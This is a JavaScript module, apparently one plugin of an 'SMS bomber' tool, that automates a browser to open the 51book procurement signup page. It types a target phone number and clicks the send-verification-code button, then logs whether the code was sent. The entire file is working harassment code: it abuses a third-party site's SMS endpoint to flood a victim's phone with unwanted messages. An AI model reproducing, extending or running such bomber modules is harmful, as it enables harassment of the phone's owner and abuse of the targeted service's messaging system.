const {
  log: {
    successlog,
    faillog,
  },
} = require('../../../utils');

const Bomber = require('../Bomber');

class Bomb extends Bomber {
  constructor() {
    super({
      id: '51book',
      url: 'http://caigou.51book.com/caigou/manage/designatedRegistryNewSignon.in',
      phoneSelector: 'input[name="moblie"]', // emm...他们的单词拼错了
      sendButtonSelector: 'input#sendMSgBtu',
    });
  }

  async chaos(ctx) {
    const {
      id,
      url,
      phoneSelector,
      sendButtonSelector,
    } = this;

    const {
      phone,
      browser,
    } = ctx;

    const page = await browser.newPage();
    await page.goto(url);

    const [
      phoneInputElement,
      sendButtonElement,
    ] = await Promise.all([
      await page.$(phoneSelector),
      await page.$(sendButtonSelector),
    ]);

    await phoneInputElement.type(phone);
    await page.waitFor(200);
    await sendButtonElement.click(); // 发送验证码
    await page.waitFor(200);

    const value = await page.evaluate((selector) => {
      const $sendButtonElement = document.querySelector(selector);
      return Promise.resolve($sendButtonElement.value);
    }, sendButtonSelector);

    if (/\d+/.test(value)) {
      // await page.waitForSelector('#sendMSgBtu[disabled]', {
      //   timeout: 300,
      // });
      successlog(`${id}`);
      await page.close();
    } else {
      faillog(`${id}`);
    }
  }
}

module.exports = new Bomb();
